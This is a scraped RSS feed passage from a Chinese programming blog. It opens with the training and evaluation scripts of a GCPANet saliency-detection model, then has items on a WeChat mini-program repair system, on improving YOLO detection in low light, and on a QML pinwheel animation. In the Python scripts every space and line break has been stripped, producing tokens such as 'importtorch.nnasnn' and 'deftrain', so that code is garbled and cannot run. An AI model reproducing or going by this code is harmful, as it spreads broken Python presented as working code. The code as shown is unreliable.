file:",self.cfg.snapshot)passelse:weight_init(self)train.pyimportsysimportdatetimeimporttorchimporttorch.nnasnnimporttorch.nn.functionalasFfromtorch.utils.dataimportDataLoaderfromtensorboardXimportSummaryWriterfromdataimportdatasetfromnetimportGCPANetimportloggingasloggerfromlib.data_prefetcherimportDataPrefetcherfromlib.lr_finderimportLRFinderimportnumpyasnpimportmatplotlib.pyplotasplt#设置日志文件标签和保存路径TAG="ours"SAVE_PATH="ours"#配置日志记录的格式和输出文件logger.basicConfig(level=logger.INFO,format='%(levelname)s %(asctime)s %(filename)s: %(lineno)d] %(message)s',datefmt='%Y-%m-%d %H:%M:%S',\filename="train_%s.log"%(TAG),filemode="w")#学习率更新策略defget_triangle_lr(base_lr,max_lr,total_steps,cur,ratio=1.,\annealing_decay=1e-2,momentums=[0.95,0.85]):first=int(total_steps*ratio)last=total_steps-firstmin_lr=base_lr*annealing_decaycycle=np.floor(1+cur/total_steps)x=np.abs(cur*2.0/total_steps-2.0*cycle+1)ifcur&lt;first:lr=base_lr+(max_lr-base_lr)*np.maximum(0.,1.0-x)else:lr=((base_lr-min_lr)*cur+min_lr*first-base_lr*total_steps)/(first-total_steps)ifisinstance(momentums,int):momentum=momentumselse:ifcur&lt;first:momentum=momentums[0]+(momentums[1]-momentums[0])*np.maximum(0.,1.-x)else:momentum=momentums[0]returnlr,momentum#设置基本学习率、最大学习率和是否进行学习率查找的标志BASE_LR=1e-3MAX_LR=0.1FIND_LR=False#训练函数,参数为数据集、网络模型deftrain(Dataset,Network):#配置数据集参数cfg=Dataset.Config(datapath='./data/DUTS',savepath=SAVE_PATH,mode='train',batch=8,lr=0.05,momen=0.9,decay=5e-4,epoch=30)#创建数据集实例和数据加载器data=Dataset.Data(cfg)loader=DataLoader(data,batch_size=cfg.batch,shuffle=True,num_workers=8)#初始化数据预取器并提高数据加载效率prefetcher=DataPrefetcher(loader)#创建模型、设为训练模式、转移到GPUnet=Network(cfg)net.train(True)net.cuda()#根据参数名称将参数分为基础参数和头部参数base,head=[],[]forname,paraminnet.named_parameters():if'bkbone'inname:base.append(param)else:head.append(param)#为基础参数和头部参数定义优化器optimizer=torch.optim.SGD([{'params':base},{'params':head}],lr=cfg.lr,momentum=cfg.momen,weight_decay=cfg.decay,nesterov=True)#记录训练过程中的指标sw=SummaryWriter(cfg.savepath)#全局步数计数器global_step=0db_size=len(loader)#若启用学习率查找,执行查找测试并绘制结果ifFIND_LR:lr_finder=LRFinder(net,optimizer,criterion=None)lr_finder.range_test(loader,end_lr=50,num_iter=100,step_mode="exp")plt.ion()lr_finder.plot()importpdb;pdb.set_trace()#进行训练forepochinrange(cfg.epoch):prefetcher=DataPrefetcher(loader)batch_idx=-1#获取图像及掩模image,mask=prefetcher.next()whileimageisnotNone:niter=epoch*db_size+batch_idx#获取当前迭代的学习率和动量lr,momentum=get_triangle_lr(BASE_LR,MAX_LR,cfg.epoch*db_size,niter,ratio=1.)optimizer.param_groups[0]['lr']=0.1*lr#for backboneoptimizer.param_groups[1]['lr']=lroptimizer.momentum=momentumbatch_idx+=1global_step+=1#获取模型输出out2,out3,out4,out5=net(image)#计算各个特征图对应的损失值loss2=F.binary_cross_entropy_with_logits(out2,mask)loss3=F.binary_cross_entropy_with_logits(out3,mask)loss4=F.binary_cross_entropy_with_logits(out4,mask)loss5=F.binary_cross_entropy_with_logits(out5,mask)#根据权重计算综合损失loss=loss2*1+loss3*0.8+loss4*0.6+loss5*0.4optimizer.zero_grad()loss.backward()optimizer.step()#绘制曲线sw.add_scalar('lr',optimizer.param_groups[0]['lr'],global_step=global_step)sw.add_scalars('loss',{'loss2':loss2.item(),'loss3':loss3.item(),'loss4':loss4.item(),'loss5':loss5.item(),'loss':loss.item()},global_step=global_step)#每10个批次打印一次训练信息ifbatch_idx%10==0:msg='%s | step:%d/%d/%d | lr=%.6f | loss=%.6f | loss2=%.6f | loss3=%.6f | loss4=%.6f | loss5=%.6f'%(datetime.datetime.now(),global_step,epoch+1,cfg.epoch,optimizer.param_groups[0]['lr'],loss.item(),loss2.item(),loss3.item(),loss4.item(),loss5.item())print(msg)#格式化并打印当前的训练状态logger.info(msg)#获取下一批数据image,mask=prefetcher.next()#每10个epoch 或最后一个epoch 保存模型权重if(epoch+1)%10==0or(epoch+1)==cfg.epoch:torch.save(net.state_dict(),cfg.savepath+'/model-'+str(epoch+1))if__name__=='__main__':train(dataset,GCPANet)test.pyclassTest(object):def__init__(self,Dataset,datapath,Network):## datasetself.datapath=datapath.split("/")[-1]print("Testing on %s"%self.datapath)self.cfg=Dataset.Config(datapath=datapath,snapshot=sys.argv[1],mode='test')self.data=Dataset.Data(self.cfg)self.loader=DataLoader(self.data,batch_size=1,shuffle=True,num_workers=8)## networkself.net=Network(self.cfg)self.net.train(False)self.net.cuda()self.net.eval()#计算模型准确度defaccuracy(self):withtorch.no_grad():#初始化指标mae,fscore,cnt,number=0,0,0,256mean_pr,mean_re,threshod=0,0,np.linspace(0,1,number,endpoint=False)cost_time=0forimage,mask,(H,W),maskpathinself.loader:image,mask=image.cuda().float(),mask.cuda().float()#记录开始时间并前向传播start_time=time.time()out2,out3,out4,out5=self.net(image)pred=torch.sigmoid(out2)torch.cuda.synchronize()end_time=time.time()#计算前向传播所需时间,并更新总时间cost_time+=end_time-start_time#计算MAEcnt+=1mae+=(pred-mask).abs().mean()#计算精确率、召回率precision=torch.zeros(number)recall=torch.zeros(number)foriinrange(number):temp=(pred&gt;=threshod[i]).float()precision[i]=(temp*mask).sum()/(temp.sum()+1e-12)recall[i]=(temp*mask).sum()/(mask.sum()+1e-12)mean_pr+=precisionmean_re+=recallfscore=mean_pr*mean_re*(1+0.3)/(0.3*mean_pr+mean_re+1e-12)#每20批次打印MAE、F-score和每秒帧数(fps)ifcnt%20==0:fps=image.shape[0]/(end_time-start_time)print('MAE=%.6f, F-score=%.6f, fps=%.4f'%(mae/cnt,fscore.max()/cnt,fps))#计算整体FPS并打印最终结果(数据集路径、MAE 和 F-score)fps=len(self.loader.dataset)/cost_timemsg='%s MAE=%.6f, F-score=%.6f, len(imgs)=%s, fps=%.4f'%(self.datapath,mae/cnt,fscore.max()/cnt,len(self.loader.dataset),fps)print(msg)logger.info(msg)#将预测结果保存为图像defsave(self):withtorch.no_grad():forimage,mask,(H,W),nameinself.loader:out2,out3,out4,out5=self.net(image.cuda().float())out2=F.interpolate(out2,size=(H,W),mode='bilinear')pred=(torch.sigmoid(out2[0,0])*255).cpu().numpy()head='./pred_maps/{}/'.format(TAG)+self.cfg.datapath.split('/')[-1]ifnotos.path.exists(head):os.makedirs(head)cv2.imwrite(head+'/'+name[0],np.uint8(pred))if__name__=='__main__':foreinDATASETS:t=Test(dataset,e,GCPANet)t.accuracy()t.save()http://www.ppmy.cn/news/1540422.html相关文章基于SSM+微信小程序的实验室设备故障报修管理系统2&amp;#x1f449;文末查看项目功能视频演示获取源码sql脚本视频导入教程视频 
1、项目介绍 
基于SSM微信小程序的实验室设备故障报修管理系统2实现了管理员&amp;#xff0c;用户&amp;#xff0c;维修员三个角色。 
管理员功能有 个人中心&amp;#xff0c;用户管理&amp;#xff0c;维修员管理&amp;#…阅读更多...YOLO模型在不同光照条件下的检测性能如何优化？域自适应方法&amp;#xff1a;通过合并多个预训练模型&amp;#xff0c;并结合生成模型来适应新的可视化任务&amp;#xff0c;无需创建额外的数据集。例如&amp;#xff0c;YOLO-in-the-Dark模型就是将预先训练好的模型与生成模型相结合&amp;#xff0c;在不增加数据集的情况下&amp;#xff0c;通过粘合层…阅读更多...QT QML 练习1这个代码是使用 QtQuick 框架编写的一个简单的 GUI 应用程序&amp;#xff0c;创建了一个窗口&amp;#xff0c;其中包含了一个背景图像、一个风车杆&amp;#xff08;pole&amp;#xff09;&amp;#xff0c;以及一个可以点击旋转的风车&amp;#xff08;pinwheel&amp;#xff09;。以下是对实现的详细介绍及其特…阅读更多...微信小程序上传组件封装uploadHelper2.0使用整理一、uploadHelper2.0使用步骤说明 
uploadHelper.js ---上传代码封装库 
cos-wx-sdk-v5.min.js---腾讯云&amp;#xff0c;对象存储封装库 
第一步&amp;#xff0c;下载组件代码&amp;#xff0c;放置到自己的小程序项目中 第二步、 创建上传对象&amp;#xff0c;执行选择图片/视频 var _this  th…阅读更多...Python案例小练习——小计算器文章目录 前言一、代码展示二、运行展示 前言 
这是用python实现一个简单的计器。 一、代码展示 
def calculate(num1, op, num2):if op  "":return float(num1)  float(num2)elif op  "-":return float(num1) - float(num2)elif op  "*":return…阅读更多...linux查看系统类型要确定系统是 Ubuntu 还是 CentOS&amp;#xff0c;可以通过查看系统的发行版信息来判断。以下是几种常见的方法&amp;#xff1a; 
方法一&amp;#xff1a;使用 cat 命令查看 /etc/os-release 文件 
这个文件包含了系统的详细信息&amp;#xff0c;包括发行版名称和版本号。 
cat /etc/os-release…阅读更多...SQL Injection | SQL 注入概述关注这个漏洞的其他相关笔记&amp;#xff1a;SQL 注入漏洞 - 学习手册-CSDN博客 0x01&amp;#xff1a;SQL 注入漏洞介绍 
SQL 注入就是指 Web 应用程序对用户输入数据的合法性没有判断&amp;#xff0c;前端传入后端的参数是可控的&amp;#xff0c;并且参数会带入到数据库中执行&amp;#xff0c;导致…阅读更多...【容易混淆】Nest模块内外及依赖注入Nest模块内外及依赖注入 从Module装饰器去考虑从模块内外考虑模块外如何注入容易混淆的点 在文档的 
Exception filters即异常过滤器的 
Binding filters一节中&amp;#xff0c;提到了 
全局绑定的两个方式&amp;#xff1a; // 第一种
filename(main)
async function bootstrap() {cons…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:56 +0000</pubDate>
    </item>
    <item>
      <title>基于SSM+微信小程序的实验室设备故障报修管理系统2</title>
      <link>https://www.ppmy.cn/news/1540421.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维基于SSM+微信小程序的实验室设备故障报修管理系统2news/2025/10/31 17:53:55/👉文末查看项目功能视频演示+获取源码+sql脚本+视频导入教程视频1、项目介绍基于SSM+微信小程序的实验室设备故障报修管理系统2实现了管理员，用户，维修员三个角色。管理员功能有 个人中心，用户管理，维修员管理，实验室管理，经验分享管理，报修信息管理，维修报告管理，维修信息管理。用户和维修员都可以在微信小程序注册登录，用户主要查看经验分享，对实验室进行报修提交，查看维修结果和留言板，维修员发布经验分享，查看报修信息，对报修内容提交维修报告并且查看维修结果。2、项目技术后端框架：SSM（Spring、SpringMVC、Mybatis）前端技术：VUE、小程序3、开发环境JAVA版本：JDK1.8（最佳）IDE类型：IDEA、Eclipse都可运行数据库类型：MySql（5.7、8.x版本都可）tomcat版本：Tomcat 7-10版本均可maven项目：是是否小程序：是maven版本：无限制硬件环境：Windows4、功能介绍4.1 登录4.2 管理员模块4.3 用户模块4.4 文档目录5、获取方式👇 👇🏻下方点开，扫一扫，关注后，后台回复关键词：报修 👇🏻👇 👇🏻下方点开，扫一扫，关注后，后台回复关键词：报修 👇🏻👇 👇🏻下方点开，扫一扫，关注后，后台回复关键词：报修 👇🏻http://www.ppmy.cn/news/1540421.html相关文章YOLO模型在不同光照条件下的检测性能如何优化？域自适应方法&amp;#xff1a;通过合并多个预训练模型&amp;#xff0c;并结合生成模型来适应新的可视化任务&amp;#xff0c;无需创建额外的数据集。例如&amp;#xff0c;YOLO-in-the-Dark模型就是将预先训练好的模型与生成模型相结合&amp;#xff0c;在不增加数据集的情况下&amp;#xff0c;通过粘合层…阅读更多...QT QML 练习1这个代码是使用 QtQuick 框架编写的一个简单的 GUI 应用程序&amp;#xff0c;创建了一个窗口&amp;#xff0c;其中包含了一个背景图像、一个风车杆&amp;#xff08;pole&amp;#xff09;&amp;#xff0c;以及一个可以点击旋转的风车&amp;#xff08;pinwheel&amp;#xff09;。以下是对实现的详细介绍及其特…阅读更多...微信小程序上传组件封装uploadHelper2.0使用整理一、uploadHelper2.0使用步骤说明 
uploadHelper.js ---上传代码封装库 
cos-wx-sdk-v5.min.js---腾讯云&amp;#xff0c;对象存储封装库 
第一步&amp;#xff0c;下载组件代码&amp;#xff0c;放置到自己的小程序项目中 第二步、 创建上传对象&amp;#xff0c;执行选择图片/视频 var _this  th…阅读更多...Python案例小练习——小计算器文章目录 前言一、代码展示二、运行展示 前言 
这是用python实现一个简单的计器。 一、代码展示 
def calculate(num1, op, num2):if op  "":return float(num1)  float(num2)elif op  "-":return float(num1) - float(num2)elif op  "*":return…阅读更多...linux查看系统类型要确定系统是 Ubuntu 还是 CentOS&amp;#xff0c;可以通过查看系统的发行版信息来判断。以下是几种常见的方法&amp;#xff1a; 
方法一&amp;#xff1a;使用 cat 命令查看 /etc/os-release 文件 
这个文件包含了系统的详细信息&amp;#xff0c;包括发行版名称和版本号。 
cat /etc/os-release…阅读更多...SQL Injection | SQL 注入概述关注这个漏洞的其他相关笔记&amp;#xff1a;SQL 注入漏洞 - 学习手册-CSDN博客 0x01&amp;#xff1a;SQL 注入漏洞介绍 
SQL 注入就是指 Web 应用程序对用户输入数据的合法性没有判断&amp;#xff0c;前端传入后端的参数是可控的&amp;#xff0c;并且参数会带入到数据库中执行&amp;#xff0c;导致…阅读更多...【容易混淆】Nest模块内外及依赖注入Nest模块内外及依赖注入 从Module装饰器去考虑从模块内外考虑模块外如何注入容易混淆的点 在文档的 
Exception filters即异常过滤器的 
Binding filters一节中&amp;#xff0c;提到了 
全局绑定的两个方式&amp;#xff1a; // 第一种
filename(main)
async function bootstrap() {cons…阅读更多...SpringBoot实现桂林旅游的智能推荐3系统分析 3.1可行性分析 通过对本桂林旅游景点导游平台实行的目的初步调查和分析&amp;#xff0c;提出可行性方案并对其一一进行论证。我们在这里主要从技术可行性、经济可行性、操作可行性等方面进行分析。 3.1.1技术可行性 本桂林旅游景点导游平台采用SSM框架&amp;#xff0c;JAVA作…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:55 +0000</pubDate>
    </item>
    <item>
      <title>YOLO模型在不同光照条件下的检测性能如何优化？</title>
      <link>https://www.ppmy.cn/news/1540420.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维YOLO模型在不同光照条件下的检测性能如何优化？news/2025/10/31 17:53:54/域自适应方法：通过合并多个预训练模型，并结合生成模型来适应新的可视化任务，无需创建额外的数据集。例如，YOLO-in-the-Dark模型就是将预先训练好的模型与生成模型相结合，在不增加数据集的情况下，通过粘合层进行训练，以提高在弱光环境下的目标检测性能。数据增强：通过对训练图像进行gamma校正，使COCO数据集的直方图与SID数据集的直方图接近，从而改善模型在暗光条件下的结果。但需注意，模型对gamma值非常敏感，需要精细调整。模型架构改进：YOLOv8引入了Anchor-Free点检测，简化了模型架构，并提高了对小物体的性能。YOLOv10进一步采用了减少计算开销的创新方法，同时保持了高准确性。低光照图像目标检测：通过使用YOLOv8全系列模型，针对昏暗光线低光照场景下的目标检测进行优化。YOLOv8系列模型在不同参数设置下展现出不同的性能表现，适用于不同的应用场景。金字塔增强网络（PE-YOLO）：结合了PENet与YOLOv3，使用拉普拉斯金字塔将图像分解为不同分辨率的组件，并通过细节处理模块（DPM）和低频增强滤波器（LEF）增强图像细节和低频信息，以提高暗光条件下的目标检测性能。改进的YOLO算法：提出了一种基于YOLO算法的抗光照目标检测网络模型YOLO-RLG，通过将RGB数据转换为HSV数据，并分离出抗光照能力强的S通道，与RGB数据合并生成RGBS数据，增强了模型的抗光照能力。轻量化YOLO：结合ShuffleNetv2和Transformer，重塑YOLOv7，以提高移动平台上的操作效率和速度，同时确保高准确度。深度可分离卷积（DCNv4）和空间金字塔池化（SPPF）：在YOLOv8中引入DCNv4和SPPF进行优化，以提高自动驾驶系统在暗光环境下的目标检测能力。PE-YOLO改进主干：PE-YOLO通过拉普拉斯金字塔将图像分解成多个分辨率的组件，增强图像细节和低频信息，包括细节处理模块（DPM）和低频增强滤波器（LEF），以提升暗光条件下的检测性能。通过这些方法，YOLO模型在不同光照条件下的检测性能得到了显著优化，使其能够更好地适应各种实际应用场景。http://www.ppmy.cn/news/1540420.html相关文章QT QML 练习1这个代码是使用 QtQuick 框架编写的一个简单的 GUI 应用程序&amp;#xff0c;创建了一个窗口&amp;#xff0c;其中包含了一个背景图像、一个风车杆&amp;#xff08;pole&amp;#xff09;&amp;#xff0c;以及一个可以点击旋转的风车&amp;#xff08;pinwheel&amp;#xff09;。以下是对实现的详细介绍及其特…阅读更多...微信小程序上传组件封装uploadHelper2.0使用整理一、uploadHelper2.0使用步骤说明 
uploadHelper.js ---上传代码封装库 
cos-wx-sdk-v5.min.js---腾讯云&amp;#xff0c;对象存储封装库 
第一步&amp;#xff0c;下载组件代码&amp;#xff0c;放置到自己的小程序项目中 第二步、 创建上传对象&amp;#xff0c;执行选择图片/视频 var _this  th…阅读更多...Python案例小练习——小计算器文章目录 前言一、代码展示二、运行展示 前言 
这是用python实现一个简单的计器。 一、代码展示 
def calculate(num1, op, num2):if op  "":return float(num1)  float(num2)elif op  "-":return float(num1) - float(num2)elif op  "*":return…阅读更多...linux查看系统类型要确定系统是 Ubuntu 还是 CentOS&amp;#xff0c;可以通过查看系统的发行版信息来判断。以下是几种常见的方法&amp;#xff1a; 
方法一&amp;#xff1a;使用 cat 命令查看 /etc/os-release 文件 
这个文件包含了系统的详细信息&amp;#xff0c;包括发行版名称和版本号。 
cat /etc/os-release…阅读更多...SQL Injection | SQL 注入概述关注这个漏洞的其他相关笔记&amp;#xff1a;SQL 注入漏洞 - 学习手册-CSDN博客 0x01&amp;#xff1a;SQL 注入漏洞介绍 
SQL 注入就是指 Web 应用程序对用户输入数据的合法性没有判断&amp;#xff0c;前端传入后端的参数是可控的&amp;#xff0c;并且参数会带入到数据库中执行&amp;#xff0c;导致…阅读更多...【容易混淆】Nest模块内外及依赖注入Nest模块内外及依赖注入 从Module装饰器去考虑从模块内外考虑模块外如何注入容易混淆的点 在文档的 
Exception filters即异常过滤器的 
Binding filters一节中&amp;#xff0c;提到了 
全局绑定的两个方式&amp;#xff1a; // 第一种
filename(main)
async function bootstrap() {cons…阅读更多...SpringBoot实现桂林旅游的智能推荐3系统分析 3.1可行性分析 通过对本桂林旅游景点导游平台实行的目的初步调查和分析&amp;#xff0c;提出可行性方案并对其一一进行论证。我们在这里主要从技术可行性、经济可行性、操作可行性等方面进行分析。 3.1.1技术可行性 本桂林旅游景点导游平台采用SSM框架&amp;#xff0c;JAVA作…阅读更多...Python 使用 Jarvis 算法或包装的凸包（Convex Hull using Jarvis’ Algorithm or Wrapping）给定平面中的一组点&amp;#xff0c;该集合的凸包是包含该集合所有点的最小凸多边形。 我们强烈建议您先阅读以下文章。  如何检查两个给定的线段是否相交&amp;#xff1f; 
c https://blog.csdn.net/hefeng_aspnet/article/details/141713655 java https://blog.csdn.net/hefeng_aspne…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:55 +0000</pubDate>
    </item>
    <item>
      <title>QT QML 练习1</title>
      <link>https://www.ppmy.cn/news/1540419.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维QT QML 练习1news/2025/10/31 17:53:54/这个代码是使用 QtQuick 框架编写的一个简单的 GUI 应用程序，创建了一个窗口，其中包含了一个背景图像、一个风车杆（pole），以及一个可以点击旋转的风车（pinwheel）。以下是对实现的详细介绍及其特点：代码结构及实现细节导入 QtQuickimport QtQuick这个导入语句引入了QtQuick模块，它是创建现代、动画丰富的用户界面的核心模块。创建窗口 (Window)Window {width: 500height: 300visible: truetitle: qsTr("小风车转转呀转")创建了一个宽 500 像素，高 300 像素的窗口。设置visible: true使窗口可见。设置title为"小风车转转呀转"，这会在窗口顶部显示。背景图片 (background)Image {anchors.fill: parentid: backgroundsource: "./background.png"创建一个Image元素，用于显示背景图。使用anchors.fill: parent使背景图片填充整个窗口。设置source: "./background.png"，从当前目录加载背景图。风车杆 (pole)Image {id: polesource: "./pole.png"width: background.width * 0.02height: background.height * 0.6anchors.bottom: parent.bottomanchors.horizontalCenter: parent.horizontalCenter创建了一个Image元素用于表示风车杆。设置了source属性从文件加载风车杆的图像。width和height使用背景的尺寸进行百分比设置，以适应窗口的变化，保持比例一致。使用anchors.bottom: parent.bottom使风车杆底部与背景的底部对齐。anchors.horizontalCenter: parent.horizontalCenter确保风车杆水平居中。风车 (pinwheel)Image {id: pinwheelsource: "./pinwheel.png"width: background.width * 0.16height: widthanchors.bottom: pole.topanchors.horizontalCenter: pole.horizontalCenterrotation: 20Behavior on rotation {NumberAnimation {duration: 500}}
}创建了另一个Image元素用于显示风车。设置了source为"./pinwheel.png"，加载风车图片。width设置为background.width * 0.16，这使风车的宽度随着背景变化保持比例。height设置为和width相同，以确保风车为正方形。使用anchors.bottom: pole.top使风车的位置位于风车杆的顶部，水平居中对齐风车杆。设置初始旋转角度为20，通过rotation: 20。使用Behavior on rotation，定义了一个NumberAnimation，动画持续时间为500毫秒，保证旋转角度变化时有平滑过渡效果。点击旋转控制 (MouseArea)MouseArea {anchors.fill: parentonClicked: pinwheel.rotation += 360
}MouseArea用于响应鼠标点击事件，anchors.fill: parent表示MouseArea填充整个窗口。当点击窗口时，会执行onClicked中的代码，将pinwheel.rotation增加360度，使风车旋转一圈。每次点击风车都会增加rotation值，因此风车看起来会顺时针旋转。代码的特点组件结构清晰窗口（Window）中包含背景（background）、风车杆（pole）和风车（pinwheel）等元素，结构清晰，便于理解和维护。动画效果使用了NumberAnimation对风车的旋转进行平滑处理，使得风车旋转起来更加自然，不会突然改变角度。响应用户交互MouseArea提供了用户交互，点击可以让风车旋转，实现了简单的用户交互功能。相对布局使用相对布局，风车和风车杆的位置相对于背景进行调整，这样即使改变窗口大小，风车和风车杆的相对位置也能保持一致。尺寸动态调整使用background.width和background.height的比例来设置风车杆和风车的尺寸，确保窗口大小变化时整体布局和比例保持不变。可改进的地方持续旋转目前点击一次只能让风车旋转一圈，可能需要通过状态控制和无限循环动画来实现持续旋转的效果。点击控制开始和停止可以改进为点击一次启动旋转，再次点击则停止旋转，实现更灵活的用户交互。尺寸和布局的改进可以考虑使用更精细的布局方式，进一步确保在不同窗口尺寸下的稳定性和美观性，比如使用Layout模块进行更细致的布局控制。总体来说，这段代码实现了一个基本的可交互的动画界面，具有相对简单的动画和交互功能，是学习 QML 及其动画、布局和用户交互特性的良好起点。功能：点击鼠标，风车旋转360度import QtQuickWindow{width:500/* background.width */height:300/* background.height */visible:truetitle:qsTr("小风车转转呀转")Image{anchors.fill:parentid:backgroundsource:"./background.png"// URLImage{id:polesource:"./pole.png"width:background.width*0.02// 使用背景的宽度的百分比来设置杆子的宽度height:background.height*0.6// 使用背景的高度的百分比来设置杆子的高度anchors.bottom:parent.bottomanchors.horizontalCenter:parent.horizontalCenter}Image{id:pinwheelsource:"./pinwheel.png"width:background.width*0.16// 使用背景的宽度的百分比来设置风车的宽度height:width// 确保风车保持正方形anchors.bottom:pole.topanchors.horizontalCenter:pole.horizontalCenterrotation:20Behavior on rotation{NumberAnimation{duration:500}}}MouseArea{anchors.fill:parentonClicked:pinwheel.rotation+=360}}}http://www.ppmy.cn/news/1540419.html相关文章微信小程序上传组件封装uploadHelper2.0使用整理一、uploadHelper2.0使用步骤说明 
uploadHelper.js ---上传代码封装库 
cos-wx-sdk-v5.min.js---腾讯云&amp;#xff0c;对象存储封装库 
第一步&amp;#xff0c;下载组件代码&amp;#xff0c;放置到自己的小程序项目中 第二步、 创建上传对象&amp;#xff0c;执行选择图片/视频 var _this  th…阅读更多...Python案例小练习——小计算器文章目录 前言一、代码展示二、运行展示 前言 
这是用python实现一个简单的计器。 一、代码展示 
def calculate(num1, op, num2):if op  "":return float(num1)  float(num2)elif op  "-":return float(num1) - float(num2)elif op  "*":return…阅读更多...linux查看系统类型要确定系统是 Ubuntu 还是 CentOS&amp;#xff0c;可以通过查看系统的发行版信息来判断。以下是几种常见的方法&amp;#xff1a; 
方法一&amp;#xff1a;使用 cat 命令查看 /etc/os-release 文件 
这个文件包含了系统的详细信息&amp;#xff0c;包括发行版名称和版本号。 
cat /etc/os-release…阅读更多...SQL Injection | SQL 注入概述关注这个漏洞的其他相关笔记&amp;#xff1a;SQL 注入漏洞 - 学习手册-CSDN博客 0x01&amp;#xff1a;SQL 注入漏洞介绍 
SQL 注入就是指 Web 应用程序对用户输入数据的合法性没有判断&amp;#xff0c;前端传入后端的参数是可控的&amp;#xff0c;并且参数会带入到数据库中执行&amp;#xff0c;导致…阅读更多...【容易混淆】Nest模块内外及依赖注入Nest模块内外及依赖注入 从Module装饰器去考虑从模块内外考虑模块外如何注入容易混淆的点 在文档的 
Exception filters即异常过滤器的 
Binding filters一节中&amp;#xff0c;提到了 
全局绑定的两个方式&amp;#xff1a; // 第一种
filename(main)
async function bootstrap() {cons…阅读更多...SpringBoot实现桂林旅游的智能推荐3系统分析 3.1可行性分析 通过对本桂林旅游景点导游平台实行的目的初步调查和分析&amp;#xff0c;提出可行性方案并对其一一进行论证。我们在这里主要从技术可行性、经济可行性、操作可行性等方面进行分析。 3.1.1技术可行性 本桂林旅游景点导游平台采用SSM框架&amp;#xff0c;JAVA作…阅读更多...Python 使用 Jarvis 算法或包装的凸包（Convex Hull using Jarvis’ Algorithm or Wrapping）给定平面中的一组点&amp;#xff0c;该集合的凸包是包含该集合所有点的最小凸多边形。 我们强烈建议您先阅读以下文章。  如何检查两个给定的线段是否相交&amp;#xff1f; 
c https://blog.csdn.net/hefeng_aspnet/article/details/141713655 java https://blog.csdn.net/hefeng_aspne…阅读更多...Docker systemdocker system --help 
siqialiyun-sh-001:~/images$ sudo docker system --helpUsage:  docker system COMMANDManage DockerCommands:df          Show docker disk usage(显示docker磁盘使用情况)events      Get real time events from the server(从服务器获取实时事件)in…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 